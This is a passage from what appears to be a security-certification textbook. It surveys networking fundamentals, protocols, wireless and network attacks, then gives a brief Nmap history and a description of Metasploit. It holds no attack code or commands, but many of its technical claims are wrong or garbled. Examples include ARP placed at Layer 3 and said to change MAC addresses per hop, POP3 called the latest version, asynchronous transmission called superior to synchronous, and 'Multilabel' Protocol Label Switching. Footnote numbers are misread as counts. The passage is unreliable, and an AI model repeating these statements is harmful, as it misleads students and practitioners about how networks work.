Broken up into four octets, an IP address looks like this: 192.13.139.130\. It gives us information about the network number and who the hosts were depending on the class, the network number could range from the leftmost octet to three of the leftmost octets while the fourth octets point to the host within that network.

Of course, with the introduction of Classless Inter-Domain Routing in the 1990s, the allocation of IP addresses is not based on the number of hosts in a network but merely on the unallocated addresses available.

Of course, there is a private IP address that is still used today, and which has specific ranges in the four classes as well. These types of addresses are restricted to use within private networks and are not routable over the Internet. However, there is a provisional service called the Network Address Translation service that will route information over the internet but also convert a private IP address to a public one and back. Still, even if this seems like a useful service for being able to represent an entire network of IP addresses as one single address, IPv6 has always been the preferred choice when it comes to dealing with the lack of IPv4 addresses.

IPv4 vs. IPv6

Up until the 1990s, IPv4 was being used but with the growing popularity of the internet, the protocol was experiencing much strain. Security and a lack of unallocated addresses were at the core of its problem. For this, IPv6 was introduced and brought with it benefits such as a larger address field, better security, smaller IP packet header and improved quality of service.

MAC Addressing

Up until we’ve only looked at addressing that takes place at layer 3 and that are known as logical addressing. MAC addressing takes place at layer 2 and which is classified as physical addressing because it is a permanent and unique address. 

A normal MAC address looks like this: 02:25:31:55:72:ac

There’s a good reason for MAC addresses to be this way too. This comes in handy when the ARP changes the MAC addresses at every hop, which ensures that a packet will reach its destination by moving throughout each of these network devices along the way based on the routing information.

Network Transmission Types

There are a variety of media types that are used to transmit data that involve unique processes and which possess distinct characteristics. Let us discuss a few of these common network transmission types:

1: Analog vs. Digital

This is probably the best example to describe analog signals as used in analog telephony. By nature, analog signals have an infinite number of values. Digital signals, on the other hand, that occur in computer transmissions have two values: on and off. As a result, digital signals are preferred because they are less susceptible to noise on the line but can travel much further compared to analog signals.

2: Asynchronous vs. Synchronous

When two systems are communicating, using the same data format is just as important as being using the same synchronization technique. While asynchronous data transmission uses to start, stop and parity bits to ensure the accurate transmission of data, synchronous transmission employs a clocking mechanism that syncs both the sender and the receiver. Quite clearly, it uses a different type of error checking and in being superior to synchronous transmissions, is used for high-speed, high-volume transmissions.

3: Broadband vs. Baseband

Since all data transmission occurs through communication channels, multiple transmissions can complicate matters. Sharing the channel becomes inevitable and which brings us to the broadband and baseband methods of doing this. While multiple transmissions are allocated different time slots on a channel (also known as Time Division Multiplexing), another approach involves sharing the channel by breaking the medium up into different frequencies (also known as Frequency Division Multiplexing). The first is called baseband while the latter is called broadband. Since the latter allows for data transmission to occur simultaneously, it is a preferred method of data transmission.

4: Unicast, Multicast & Broadcast

There are three types of transmissions that occur that differ in regard to the extent of their reception. The unicast method is also known as one-to-one and is a transmission from one system to another. A signal that is sent from one system to many is called a multicast transmission. Finally, if one signal is sent to every system in the network, it is known as a broadcast or a one-to-all transmission.

5: Wired vs. Wireless

Since not all transmissions use a wired connection, the way the bits are represented differ based on the type of medium you are using. With copper wires, shifts in voltage do this while in optic fiber cables, light in the form of LED or lasers carry out the same function. Wireless transmissions use light or radio waves to do the same.

When a packet moves from the wired to a wireless network, the physical and data link layers are prone to change and which calls for the necessary protocol to be used to deal with this change. That said, the other layers of the OSI model do not undergo any changes much like the Physical and Link layers as described in this sense.

Network Types

There’s a third way of looking at networks and which involves network types. Some of the common types include LAN, MAN, and WAN apart from extranet and intranet. 

LAN, MAN & WAN

The traditional interpretation of LAN involves a set of computers linked in an office but by modern-day standards, it is any network that consists of a speed greater than 10 MBps. On the other hand, A MAN is a wide area network that is spread over larger distances serve much like the downtown area of a city. It serves as a backbone for LANs to connect with. Finally, a WAN connects both LANs and MANs together and which is generally offered as a service from a telecommunications company. Of course, the Internet is the perfect example of a WAN. That said, not all WANs connect to the internet but are private, dedicated links that organizations will pay for.

Intranet & Extranet

Both these network types that exist within an organization and segregated for security purposes. While the intranet is the internal network of the organization, the extranet offers organizational resources to customers, business partners and the public. That said, sensitive information should not be placed in the latter. The extranet should be constantly monitored much like the intranet is protected with firewalls and strong authentication mechanisms. 

Protocols & Services

Due to the increasing popularity of the use of networks, several new protocols have been developed since the nineties. Much like the protocols that we discussed in the Application layer of the TCP/IP Model, these protocols are linked with a particular service. Some of these protocols that we will discuss going forward do not only lie in the Application layer but in lower layers that deal with routing and the delivery of packets. As always, port or protocol numbers are considered important

ARP

Known as the Address Resolution Protocol, this protocol resides in Layer 3 of the OSI Model. The objective of ARP is to add the MAC address of the destination host by sending a broadcast frame over the network. The destination host with its unique IP address responds with its MAC address. This information is added to the packet header.

DHCP

This service helps you automate the assigning of IP addresses to all devices in a network and exists as a client in any operating system. Since it is a client/server program, you can even configure it as a server. This is easy since most operating systems have DHCP clients. DHCP uses UDP ports 67 and 68.

DNS

This service is instrumental in the sense that it resolves IP addresses of hosts as a computer name. Similarly, domain names are assigned to websites. DNS exists as a client/server program in most operating systems and uses UDP and TCP port 53. 

ICMP

This ICMP operates at the Network Layer of the OSI Model and is used by systems to transmit error messages if problems with transmissions arise. The ping and traceroute commands are a part of this protocol and that helps with network connectivity problems.

FTP, FTPS, SFTP, NFS & CIFS/SMB

The File Transfer Protocol (FTP) is commonly used to transfer a file from one system to another. FTPS and SFTP are more secure versions of this protocol. NFS is a file-sharing protocol that is used in UNIX/Linux systems. The CIFS/SMB protocol uses TCP port 445.

HTTP, HTTPS & SHTTP

The HTTP protocol is used to transfer web content and has two other secure versions namely the HTTPS and SHTTP. HTTPS adds HTTP on top of the SSL/TLS protocol. While HTTP uses TCP port 80, HTTPS uses TCP port 443\. SHTTP plays the role of encrypting the served and saved page data.

POP, SMTP & IMAP

All three protocols work in order to retrieve emails. While POP3 is the latest version and allows for download only. IMAP4 accesses email from a server but it not only downloads a copy from the server but leaves one there too. SMTP differs from both POP and IMAP because it is used for communication between email servers. 

SNMP

This Application layer protocol retrieves information from network devices and uses the UDP 161 as well as TCP 161 and 162 ports. Even though this protocol is susceptible to packet-sniffing and brute force attacks, the SNMPv3 protocol is considered most secure.

Implications of Multi-Layer Protocols

As you can see, encapsulation plays a big role in the TCP/IP model and which gives rise to the possibility of being a multi-layer protocol. In today’s world, plenty of proprietary protocols have been developed and are used in industrial control systems and power grids. Since these SCADA systems aren’t secure, security architects and professionals are learning how to protect these critical systems. Of course, there are other multi-layer protocols that are used for profit. Some use the TCP/IP protocol stack in order to route their own protocols. As mentioned earlier, encapsulation helps in creating multi-layer protocols much like this simple example mentioned below:

[ Ethernet [ IPSec [ IP [ TCP [ SSL [ HTTP ] ] ] ] ] ]

As you can see, HTTP is encapsulated by SSL, TCP, IP, IPSec and Ethernet and which can prove to be advantageous given that you can support complex network structures with a high degree of flexibility and resiliency. The downside is that multi-layer protocols are sometimes used for covert tasks that are anything but useful or positive.

In particular, there is one multi-layer protocol referred to as the Distributed Network Protocol (DNP3) and which is largely used in the electric, water utility, and management industries. Its purpose is to facilitate communication between data acquisition and system control systems in place. This multi-layer protocol is very similar to the TCP/IP protocol suite and is an open and public standard.

Converged Protocols

Converged protocols are those that involve the merging of proprietary protocols with standard protocols much like TCP/IP. In fact, one can use TCP/IP support network infrastructure to host their own services. This saves money, reliability, and throughout vary from implementation to implementation.

Here are four examples of converged protocols:

FCoE

Fibre Channel is a network data storage solution that can help you transfer files at a high speed from 16 GBps and above. While fiber-optic cables were to be used in its operation, another less expensive was developed using copper wires known as Fibre Channel over Ethernet (FCoE). It operates as a Layer 3 protocol, uses separate cables and replaces IP to become the standard payload of any standard Ethernet network.

MPLS

Multilabel Protocol Label Switching avoids the use of longer network addresses but uses shorter paths labels to move data across a network. This can save much more time compared to the traditional IP routing process. The best part: MPLS can be used to manage protocols that are not part of the TCP/IP protocol suite or even compatible with the suite itself.

VoIP

Voice over IP is defined as a tunneling mechanism that can move data or voice over a TCP/IP network. Not only has it been considered to be an excellent replacement for PSTN over computer networks but it also can be used on smartphones. Important options such as videoconferencing and remote collaboration on projects are available with VoIP. That said, certain VoIP solutions are meant to replace telephone handsets or to be used as software. Skype is one example of the latter.

iSCI

Considered to be a low-cost alternative to FCoE, iSCI is a network storage standard that is based on IP. You can use this location-independent technology to store, retrieve and transmit files over LAN, WAN among other internet connections.

Software-Defined Networking

Software-defined networking provides a new take on network operation, design, and maintenance. Organizations have to deal with certain limitations when it comes to network design and which is why they have no choice but to stick with one vendor. However, with SDN, the control layer (network service of data transmission management) and infrastructure layer (hardware and hardware settings) are separated. Also, since SDN can be programmed from a central location, the advantages that it offers include being open standards-based, vendor-neutral and flexible. Most of all, with this type of network, organizations can use hardware of their choice based on benefits such as top throughput-rated or cost-effective devices.

Wireless Networks

Even if wireless networking was difficult for the security threats that it posed at first, its popularity soared among users. Over time, with the development of security, this became less of a problem and security professionals began to adopt wireless networking. So, let’s look at a number of concepts pertaining to wireless networks.

WLAN & Cellular Techniques

While varying voltages signify the zeros and ones but data sent over a wired network, this is represented by radio waves over a wireless network. Termed as modulation, here are a few techniques used to transmit data over both WLANs and cellular networks.

WLANs

The four common techniques used over WLANs include Frequency Hopping Spread Spectrum, Direct Sequence Spread Spectrum, Orthogonal Frequency Division Multiplexing, and Vectored Orthogonal Frequency Division Multiplexing. While the first two were part of the original 802.11 standards, the latter two are far more advanced forms of modulation. The last one was developed by Cisco.

Cellular Networks

The five techniques used for modulation over cellular networks include Frequency Division Multiple Access (FDMA), Time Division Multiple Access (TDMA), Code Division Multiple Access (CDMA), Orthogonal Frequency Division Multiple Access (OFDMA) and Global System for Mobile Communications (GSM). While TDMA was an improvement over FDMA, CDMA allows calls to use all frequencies by spreading data across the spectrum. OFDMA improves FDMA and is commonly used for 4G cellular devices. Finally, GSM offers a cell phone with a SIM card that has to remain on the phone for it to work. Secret cryptography is used to prevent cell phone cloning.

Satellites

Satellites can not only provide television programming services to users but also the internet through the use of microwave technology. While they can be slow compared to other types, this type of technology is very useful in remote locations where no other solutions can be implemented.

WLAN Structure

Before we can look at WLAN standards, it’s a good idea to get an idea of WLAN components and overall structure.

Access Point

This wireless transmitter and receiver are connected with the wired portion and is an acceptable point to the network for wired devices. Routers are common examples. These days, “thin” access points resemble antennas that can be connected with a central system called controllers.

SSID

This name or value is used to distinguish a WLAN from other WLANs. It can be hidden or broadcast by the access point. Hiding the SSID is not a competent security strategy since it merely removes the beacon frame. Since other frames also exist, the discovery of the existence of a wireless network can be “sniffed.” 

Infrastructure vs. Ad Hoc Mode

Since a WLAN has to contain one AP, all communication between stations and devices will have to be routed through the AP and is called the Infrastructure mode. The Ad Hoc mode is where stations and devices can communicate with each other directly without the need for the AP.

WLAN Standards

The 802.11 Standard

The 802.11 standards have been around for a while. There have been several amendments made to this standard but are sometimes regarded as separate ones. These include 802.11a, 802.11b, 802.11c, 802.11f, 802.11g & 802.11n.

Bluetooth

This wireless technology can be used to create personal area networks between devices and peripherals. Bluetooth 3.0 and 4.0 can function at speeds 24 Mbps. Bluejacking and bluesnarfing where unauthorized message and access takes place.

Infrared

This short-distance wireless technology uses light instead of radio waves and requires both devices to have an infrared port. It can operate at a range of 5 meters at a speed of up to 4 Mbps. The IrTran-P protocol can cause security issues as it accepts files automatically.

Near Field Communication (NFC)

Two communication devices, when brought as close as 2 inches to each other, can be used to make payments or read electronic tags. One of these two devices is usually a mobile device.

WLAN Security

In order to implement 802.11 technologies safely, you must understand the security measures that have been developed and used over time. Open System and Shared Key Authentication were legacy authentication methods used while the three security measures for wireless networks include WEP, WPA, and WPA2\. WPA2 is considered to be much more secure since it is based on the CCMP protocol compared to the TKIP protocol used in WPA.

MAC Filter

This security measure includes the addition of MAC Addresses that are allowed to access to the AP. Still, MAC addresses can be spoofed and which is why this isn’t such a good security measure. That said, you can blacklist or deny particular devices access to the AP.

Cryptography Used to Maintain Communications Security

There are two types of protection available depending on the level of communication that you would like to use. First, link encryption repeatedly encrypts and decrypts all information sent as part of data transmission while end-to-end encryption only encrypts the internal information sent but not the packet header information that is necessary for routing.

Link Encryption

As mentioned earlier, all data is encrypted in this type of data transmission with the exception of the data-link control information. As it moves along its route to the destination host, each router at a certain point decrypts the information in order to obtain header information for its destination and encrypts the information again.

As a person sending data over the internet, either by email or in which banking institutions have to communicate with their customers, then link encryption is preferred. This is because all data is encrypted and provides privacy and security. On the downside, all devices the data passes through must receive the key and key changes if necessary. Apart from this, the decryption of the packet at each routing point has to take place in order for it to move further along the route. 

End-to-End Encryption

In this type of encryption, encryption of the data is restricted to everything apart from packet headers and addresses. This makes it more susceptible to hackers who can gain more information about packets by sniffing or eavesdropping. Still, end-to-end encryption allows for users to have control over what gets encrypted or not. In addition, since there is no repeated decryption or encryption at each routing point, the performance of routing devices improves greatly. IPSec is one such example of end-to-end encryption.

Actively Secure Network Components

There’s an important reason why network components must be secured along with protecting data in transit. This is for the simple reason that if compromised, the information in the network can be easily accessed by attackers. In other words, both matters.

Hardware

So, what do we mean by network components?

This can be classified into five parts: hardware, transmission media, network access control devices apart from endpoint security and content-distribution networks and which we will look at next.

Modem

Serving as a portmanteau for modulator/demodulator, the modem gives remote users access to a network by means of an analog phone line. When the user sends an analog signal to the modem, it is converted to a digital signal that is usually sent to a server. As a result, when the server responds to the signal, the digital signal is converted back to analog and sent back to the remote user.

While this can prove to be useful for those who find themselves traveling on work, this type of access can give attackers a way in while security personnel are busy protecting the Internet gateway.

While not allowing modems to be placed on the network is a common approach to prevent threats, telephony firewalls are also used and monitor both incoming and outgoing analog calls. As a result, online certain numbers can be used to make modem calls into the organization’s phone exchange.

That said, the telephony firewall mentioned earlier is much like an IP firewall where it sits between the PSTN and the organization’s telephone network.

Bridges and Switches

Local area networks have been known to grow in size and which not only reduces bandwidth but reaches a point where the LAN cannot expand anymore.

Increasing the cable length and the size of the LAN will only increase attenuation. Is there a way to connect two LANs without reconfiguring both networks?

The common solution to this is called a Layer 2 device known as a bridge and that is responsible for filtering traffic between segments by virtue of their MAC Addresses. Also, they amplify the signal while also reducing the amount of unnecessary traffic flowing through each part of the network too.

Unfortunately, despite being efficient, bridges do not prevent someone from any of the segments on the network from intercepting traffic. So, security must be taken seriously in the form of link-layer encryption and even access lists. This is particularly true for wireless bridges.

As for switches, they offer the same benefits as bridges do but are expensive. Put simply, they are multiport devices that LANs can connect to and also come with the additional benefit of increasing network bandwidth. That said, both bridges and switches can forward broadcasts to all segments in the network.

Routers

The primary function of routers is to forward packets to another network by virtue of the IP address that is added in the packet it receives. Since routers maintain a certain view of the network they’re in by means of the routing table, they then decide which device on the network should receive this packet next. This is commonly known as the next hop. Of course, if the destination IP address is not located within its network, it forwards the packet to another router that is closer to its destination. One advantage of using a router is that it connects networks of different types through which you can send packets of data without any issues.

Wireless Access Points

By definition, a wireless access point gives wireless devices access to a network. Divided into cells, this area can expand outside the secure area if wireless access point strength is not adjusted appropriately. Some of the strategies used here include shielding, noise transmission and placing the access point itself to prevent attackers from accessing the network.

Transmission Media

The importance of cables used in the design of a network cannot be overstated. Picking the right type of cable for the said network can determine whether the network succeeds in performing its function. Some of the aspects that must be taken into consideration when selecting cables are throughout distance between devices, data sensitivity, and the environment.

As for the type of cables available for selection, they include shielded and unshielded twisted pair, coaxial cable, patch panel and three types of fiber optic cables. 

Wired

As mentioned earlier, cables that you can select involve twisted pair and coaxial cables where copper wires are twisted together so as to prevent electromagnetic interference and crosstalk. Since this type is the most inexpensive, it is easily bent during installation. So, in order to resolve this, the shielded twisted pair cable is generally used and which adds an extra shield to protect the signal along with the usual protective jacket used. Of course, since it is more expensive and harder to bend when installing, this can prove to be disadvantageous not unless shielding the signal is the maximum priority.

As for coaxial cables, they protect a sizeable conductor which is then covered by a grounding braid of wire and which is separated by a non-conducting layer. In addition, a protective sheath is used to cover the entire cable. Since the coaxial cable is larger than twisted pair cables, it usually supports a larger bandwidth apart from being installed across larger distances. Intruders cannot monitor the signal while interference is blocked out by the superior protective sheath. Still, given how expensive it is, it is only used in specialized applications.

Wireless

There are two types of wireless transmissions include radio waves and microwaves. Some applications that we have looked at in an earlier chapter to transmit wirelessly include Bluetooth, Infrared, Wi-Fi and wireless transmission using satellites. 

Fiber

Even if cables continue to be used in fiber optic cables, the use of light instead of changing voltages when using copper cables. An LED or laser is used to direct the data and which turns on and off to send zeroes and ones. The receiver at the other end of the cable then interprets these bits and converts them back to the original signal.

Now, the faster the laser fluctuates, the greater the possibility of the light signal dispersing. For this, light strengtheners are used much like repeaters are. Three types of fiber optic cables are used namely single-mode, multi-mode and plastic optical fiber (POF).

Network Access Control Devices

By definition, network access control devices generally inspect devices that want access to an organization’s network. Whether they already have malware on them, are missing security updates among a host of other issues; this could affect the network as a whole and must be dealt with in real-time. Of course, the acceptable security standards that grant device access to the network has to be based on the organization’s security policy. Network access control devices (NAC) tend to act as an automated detection and response system that have been placed so as to prevent severe damage to a network or a data breach.

Firewalls

Defined as a network device that controls traffic and that serves as a barrier between the Internet and a private network, a firewall is used to filter traffic based on rules set and which distinguishes between what the organization deems as malicious or authorized traffic.

Not only are they capable of blocking unrequested traffic and connection requests from outside the network but they can also safeguard the structure and addressing scheme of a network from outside threats.

While these firewalls are not able to block malicious code, most companies that offer such protection also offer intrusion detection systems such as antivirus scanners apart from detailed logging, monitoring and auditing capabilities.

Having said that, there are three types of firewalls that are used by security professionals - static-packet filtering, circuit-level gateway, and firewalls. While static-packet filtering only examines the information provided in the packet header, firewalls look at a lot more information so as to filter out unauthorized traffic. Circuit-level gateway firewalls established connections between two trusted partners based on the circuit and not traffic content between these two entities.

Proxies

The fourth type of firewall that is commonly used includes that of the application-level gateway and which is commonly known as a proxy. Even if it does affect performance, a proxy protects the source and destination IP addresses so as to hide the identity of the private network. This is done by copying packets from one network to another which will be inspected and processed as each packet passes through the firewall. These application-layer firewalls are called so because they operate at the Application Layer of the OSI Model. 

Endpoint Security

In the past, network security depended on network border sentries such as firewalls, proxies, virus scanners among a host of IDS, IPS, and IDP solutions. Over time, this was discarded since threats not only stem from the outside but inside the network as well.

It is for this reason that the practice of endpoint security has been adopted where each and every device is responsible for its local security. Another reason why this makes much sense is that any network is only as secure as its weakest element. In other words, whether a threat exists on the border, on a server or even a client should be deemed a threat to the entire network.

Content Distribution Networks

Also known as a content delivery network (CDN), it is a system of servers located at various data centers with the objective of providing content to users and where the standards of high availability and performance are met. A lot of the content available on the internet today is part of a CDN. Some of these include downloadable objects, streaming media, web objects, and applications.

In being around for almost two decades, CDNs have proved to be successful when it comes to promoting verticals such as gaming, eCommerce, media and entertainment, and software download delivery. An excellent example of a CDN is Amazon CloudFront and Microsoft Azure CDN. Of course, viewers can easily access this content due to its availability at several data centers across the world.

Design and establish secure communication channels. Data is rather easy to secure when at rest. When it is in transit, there are a variety of threats and vulnerabilities that can affect its availability, confidentiality, and integrity. Still, all of these security issues can be handled since the purpose of communications security is to detect, mitigate and rectify transportation errors.

In order to do this, identifying the types of communication channels is the first step. Since the voice, multimedia collaboration, remote access, data communications, and virtualized networks are common channels used in organizations, we will understand how they work apart from looking at countermeasures for each of these channels.

Network and Protocol Security Mechanisms

Since we are talking about data in transit, the TCP/IP protocol suite is the one that is used most over the Internet. Still, it’s a known fact that there are security deficiencies, which is why a number of protocols, mechanisms, and applications have been developed to continue protecting transmitted data.

Broadly classified as Security Communication and Authentication protocols, we will look at the most common protocols when it comes to securing transmitted data.

Secure Communication Protocols

Some protocols have been developed so as to secure application-specific communication channels. Even if there are several that are used in conjunction with the TCP/IP protocol suite, some of these include Simple Key Management for Internet Protocol (SKIP), Software IP Encryption (swIPe), Secure Remote Procedure Call (S-RPC), Secure Sockets Layer (SSL), Transport Layer Security (TLS) and Secure Electronic Transaction (SET).

Both SKIP and swIPe are Layer 3 protocols while SSL and TLS protect communications between a web browser and server. As for S-RPC, this prevents unauthorized code execution on remote systems. Finally, SET was designed to ensure secure transactions over the internet.

Authentication Protocols

As is normal, once a connection is generally established between a server or network and a system, authentication is the next step to establishing the identity of the remote user. How these logon credentials are exchanged and whether they are encrypted varies from protocol to protocol.

There are three protocols that are commonly used such as Challenge Handshake Authentication Protocol (CHAP), Password Authentication Protocol (PAP) and Extensible Authentication Protocol (EAP). While CHAP encrypts the username and password, PAP does not. On the other EAP serves as a framework rather than as an authentication protocol itself since it offers customized security solutions such as smart cards, tokens, and biometrics.

There are newer security protocols that have emerged from these three such as Protected Extensible Authentication Protocol (PEAP) and Lightweight Extensible Authentication Protocol (LEAP). Between EAP, PEAP, and LEAP, PEAP is preferred.

Voice

Even if voice communication doesn’t directly fall under IT security, technologies like VoIP that send packets of data over the network is susceptible to interception, it’s necessary to ensure that mechanisms are put into place in the best of security and integrity.

Of course, there’s even PBX, PSTN and POTS systems that are prone to tapping, interception as well as eavesdropping but this can be sorted by protecting the physical cabling itself. As for the cabling that is outside your organization network, the phone company that you lease the line from has to.

VoIP

This technology converts audio into data packets that are sent over a TCP/IP connection. It has become popular given that it is inexpensive as a telephony solution. Still, there are a number of ways by which VoIP can be attacked in a variety of ways. Falsifying Caller IDs, spoofing call managers through Man-in-the-middle attacks, OS or DoS attacks and even 802.1X authentication falsification is very possible. For that matter, if the packets aren’t encrypted people can just listen in.

Multimedia Collaboration

Another common communication channel that is used in organizations involves multimedia collaboration and consists of two types: remote meetings and instant messaging.

Remote Meeting

By definition, this type of communication channel allows people to conduct virtual meetings by virtue of the internet. In most cases, a browser extension is installed on the host computer while allowing for desktop sharing and remote control.

When using such software, authentication and encryption is a must. Having security professionals look into this is vital while the person who moderates these meetings should be trained on how to use these applications safely.

Instant Messaging

There’s no doubt that instant messaging makes communication much easier. Especially in real-time too. Still, there are security risks that come with such applications given that they use peer-to-peer, brokered or server-oriented systems. In other words, based on the application that is used, permission must be given to certain protocols as a result. Protocols such as Internet Relay Chat (IRC) and Extensible Messaging and Presence Protocol (XMPP) come to mind.

As for threats, not only can user identification be falsified but users can also execute malicious scripts that can render their systems insecure. In addition, since file transfer options are available, there every chance of system infection as well. In some cases, its users can be victims of packet sniffing or even social engineering attacks. Spam over instant messaging is another method of attack and which is why it is considered to be insecure from an organizational standpoint.

Remote Access

If you’ve heard of the word ‘telecommuting’, you’d know that employees today have the ability to access organization resources right from the comfort of their own home. As if they are sitting in the office itself. Simply put, giving someone remote access will involve a distant client gaining access to a network.

So, how does the telecommuter connect to the network? Given that there are a number of remote connection technologies, security professionals must also keep in mind the security issues that come with these types of connections and of which Dial-up, ISDN, DSL, Cable, and VPN are the most common.

Since interception and eavesdropping are very common here, establishing a secure communication channel through encryption is vital here. Apart from this, only allowing certain people remote access and being stringent with authentication is just as important here. Apart from this, people who are working remotely might also need help from time to time. So, using the authentication and secure communication protocols discussed earlier or even a centralized remote authentication service such as RADIUS and TACACS+ can be useful here.

That said, when it comes to dial-up connections, PPP is the most commonly used protocol that has replaced SLIP.

About VPNs

A virtual private network is a connection that might use an untrusted communication network to transmit data but is protected by strong authentication protocols and encryption mechanisms in place. In other words, entire protocols wrap around each other be it a LAN, line, encryption or authentication protocol. PPTP, L2TP, and IPSec are protocols that are known to provide encryption, authentication or both.

VPN Screen Scraper

One security risk that crops up when giving remote access involves that of screen scraping. By definition, it is the ability of an attacker to scrape the screen and access sensitive information on. For this screen scraping encryption, solutions must be implemented.

Virtual Application/Desktop

The Virtual Application or Desktop is another communication channel that is growing in popularity and which gives remote users the ability to execute commands as if they were sitting at the terminal that they are accessing remotely. Since security plays an important role here too, security professionals must implement the same security measures on both the host computer as well as the virtual machine.

Virtualized Networks

Virtualized networks are able to simulate traditional networks by combining both hardware and software network resources into a single software entity that offers administrative functionality. Not only do these implementations speed up recovery times but also improve security. Virtual SANs, SDNs, guest operating systems and port isolation are some of the virtualization network types.

Virtual SAN

A virtual storage area network not only allows for the pooling of storage but also provides capabilities that include the automatic and instant allocation of virtual machine storage. Considered to be a method of software-defined storage, the availability of data is determined by the software and not the hardware here. As a result, policies can be put into place for the software to decide where the data should be placed. This, in turn, support data availability and protection compared to hardware-only options.

SDN

Software-defined networking is an approach that cuts IT costs by virtue of policy-enabled workflow automation. Not only does it separate the network control plane from the forwarding plane but it also manages to network traffic into three components: raw data, data transmission and data purpose. An SDN consists of three architecture layers such as the infrastructure, control and application layer. As a result of these layers, the hardware will not have to direct the traffic.

Guest Operating Systems and Port Isolation

If an organization decides to implement virtual networking, access to guest operating systems might be necessary. In this case, configuring a private LAN might help of which the first one created is the primary LAN. You can create others too and which will be known as secondary LANs. The secondary LAN can be configured in three modes: promiscuous, community or isolation mode. The nodes within this PVLAN will have communication restrictions imposed on it based on which mode it is in. That said, the activity of using a PVLAN is called port isolation.

Prevent or mitigate network attacks

If you wish to deal with network attacks, the first step is to understand the types that commonly occur and how they can be dealt with.  Even better is when you are able to prevent these kinds of attacks in the first place. That said, even though cabling is said to be far more secure, it still comes with its set of problems and which can affect availability.

Cabling

Noise, attenuation, and crosstalk are common problems that affected bounded networks. While shielded cabling can protect the network from noise, following the length recommendation for attenuation whether this pertains to coaxial, twisted pair or fiber optic cables work just as well. Crosstalk is a problem that affects twisted pair cables and can be solved by twisting the cables properly. That said, eavesdropping can occur on bounded media but are easier to solve. Since fiber optic cables use light instead of voltage for the signal, it can increase the difficulty of eavesdropping significantly. But what can really improve security is ensuring the physical security of these cables.

Network Component Attacks

The reason why attacks on network components take place is that they are shared by several organizations. It is vital for the security professional to understand what each of these attacks. 

Some of the most common attacks include Non-Blind Spoofing, Blind Spoofing, Man-in-the-Middle Attacks, MAC Flooding Attack, 802.1Q and Inter-Switch Link Protocol (ISL) Tagging Attack, Double-Encapsulated 802.1Q/Nested VLAN Attack and ARP Attacks.

ICMP Attacks

As we learned earlier that ICMP is a protocol that is used in the Internet layer of the TCP/IP suite. Used by routers and other network devices, its function is to send error messages or operational information pertaining to the unavailability of a service, host or router. Diagnostic tools such as ping and traceroute that uses this protocol are generally used by attackers. Common attacks as classified as ICMP attacks include the Ping of Death, Smurf, Fraggle, ICMP Redirect, Ping Scanning, and Traceroute Exploitation.

While some of these attacks look for information related to packets and IP addresses, others use the ICMP protocol to overwhelm systems. Among the lot, the DoS and DDoS attacks have made the news for the mayhem that they cause.

One smart measure to deal with such an attack is to block the protocol number for ICMP which is 1\. Some firewalls will allow you to block a particular type of ICMP message too.

DNS Attacks

DNS plays an important role in the network for being responsible for resolving IP addresses to computer and domain names. If DNS servers are targeted through DoS or DDoS attacks, it can cause a lot of chaos. Having multiple DNS servers can come in handy in case something goes wrong.  Some of the common DNS attacks include DNS Cache Poisoning, DoS, DDoS, URL Hiding, Domain Grabbing, and Cybersquatting.

Whether this involves redirecting traffic from sites so as to harvest information or even bring the network to a halt, your DNS server is the target of such attacks. In the case of domain grabbing, it’s really up to the management to purchase sites associated with names before anyone else does. 

Email Attacks

Since email is a common tool that we use every day, this has become a preferred source of an attack. In order to counter these attacks, this really stems from poor security practices on the part of the user. Some of the common email attacks include Email Spoofing, Phishing, Spear Phishing, Whaling, and Spam.

When it comes to spoofing and phishing, the objective is to obtain usernames and passwords. In the case of whaling, the stakes are even higher since the target is a person of importance. Spam, while being annoying, should still be safeguarded against as it is illegal to send people these types of emails today. 

Wireless Attacks

Given how difficult it is to find out when someone is capturing data packets that are sent out as radio waves, preventing wireless attacks can be difficult to resolve. There are two common types of wireless attacks namely wardriving and warchalking.

Both of these involve finding vulnerabilities on wireless networks and which usually occur one after the other. Just because someone cannot become a wireless client on a network, this won’t stop them from looking for valuable information.

Remote Attacks

This type of attack focuses on certain remote systems such as VPN servers or as in the past, dial-up servers but which have stopped as security practices improved. One example of the latter is war dialing where software created will dial out to a big list of numbers in order to find numbers associated with modems. If it is a telephone or a fax number, the answer will be recorded. However, if it is a modem, a connection attempt will be made leaving the network open for the attacker.

Other Attacks

Now, there’s a final list of attacks that don’t necessarily make it to any of these categories. These attacks include SYN/ACK attacks, session hijacking, port scanning, teardrop and IP Address Spoofing.

While SYN/ACK attacks serve as a type of DoS attack, the session hijacking attack attempts to collect all data sent to a particular system. Port scanning involves looking for open ports and which can then be used for attacks. While teardrop is a kind of packet fragmentation attack, IP address spoofing involves attackers who want to hide their trail or even carry out actions as another computer.

> Chapter 4 – Linux Tools

Nmap was first published in the online magazine Phrack Magazine in September 1997, created by Gordon Lyon (under the pseudonym Fyodor Vaskovich).

This first version appeared without number since no new publications of the tool had been planned. Given its popularity and high demand, new versions were published (call v1.25 came out only 4 days later) and on December 1998, version 2.00 was published.

In April 2000, version 2.50 emerged, which included ACK scans. In December of the year 2000, the first version for Windows (Nmap v2.45Beta16) was published thanks to the work of Ryan Permeh and Andy Lutomirski. In August 2002 the program code is rewritten and it goes from C language to C ++ language and support for IPv6 is added. In February 2004, version 3.50 is published, which includes packet tracking and UDP ping. During the summer of 2005 additional tools such as Zenmap, Ncat and NSE arise Version 3.90, in September of that same year, includes ARP scanning and MAC address spoofing. A special version (4.85beta5) was released on March 30, 2009, to detect the Conficker worm, which had infected millions of computers. On January 28, 2011, version 5.50 is published, which includes the generation of nping packages, in addition to a larger number of NSE scripts. In May 2012, version 6.00 came out with full IPv6 support.

Impact

Nmap was developed as a scanner for basic networks, but each new version adds even more features and its community grows day by day.

Nmap is considered one of the most important (and essential) tools for system administrators, security auditors, and hackers. This is due to a large amount of information that is able to obtain from a network in an effective (and stealthy) way.

Curiosities

Nmap has been seen in movies like Battle royale, 13: Game of Death, Matrix Reloaded, The Crystal Jungle 4 or the Bourne Ultimatum. The operating systems (as well as any other software) are not perfect, in fact, there are operating systems that carry long errors and vulnerabilities. This creates a big problem since an assailant is able to locate these failures and capitalize on their benefit.

To test vulnerabilities in our equipment we will perform pentest (penetration tests) against our systems with the Metasploit program.

Metasploit is a framework that allows you to develop, configure and execute exploits 1 against objective systems in order to make a proper pen-testing.

It contains more than 900 different exploits, mostly from Windows operating systems, although there are also for MacOsX and Unix / Linux.

In addition to the exploits, it contains 2 payloads to take advantage of them, libraries and various interfaces that we can use in our attacks.

It is written in the Ruby programming language and is free software. You can find versions for both Linux and Windows.

(1) Exploit: software that attempts to exploit a vulnerability in a system to compromise it

(2) Payload: software that allows you to take advantage of compromised computers.
